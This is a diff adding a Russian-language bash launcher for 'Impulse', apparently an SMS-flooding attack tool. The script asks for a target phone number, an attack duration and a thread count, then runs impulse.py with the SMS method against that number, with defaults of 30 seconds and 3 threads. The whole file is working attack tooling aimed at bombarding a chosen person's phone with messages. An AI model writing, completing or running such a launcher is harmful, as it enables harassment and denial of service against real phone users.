@@ -1,0 +1,22 @@
+clear
+echo
+echo Велком ту Импульс
+echo
+read -p "Целевой номер (без '+'): " target
+read -p "Время атаки в секундах (по умолчанию 30): " time
+read -p "Кол-во потоков (по умолчанию 3): " threads
+
+if [[ "$target" = "" ]]; then
+    echo "Цель не задана!"
+    impulse
+elif [[ "$time" != "" ]] && [[ "$threads" != "" ]]; then
+    python3 ~/Impulse-rus/impulse.py --method SMS --time $time --threads $threads --target +$target
+elif [[ "$time" = "" ]] && [[ "$threads" != "" ]]; then
+    python3 ~/Impulse-rus/impulse.py --method SMS --time 30 --threads $threads --target +$target
+elif [[ "$threads" = "" ]] && [[ "$time" != "" ]]; then
+    python3 ~/Impulse-rus/impulse.py --method SMS --time $time --threads 3 --target +$target
+elif [[ "$threads" = "" ]] && [[ "$time" = "" ]]; then
+    python3 ~/Impulse-rus/impulse.py --method SMS --time 30 --threads 3 --target +$target
+else
+    echo "Ошибка"
+fi
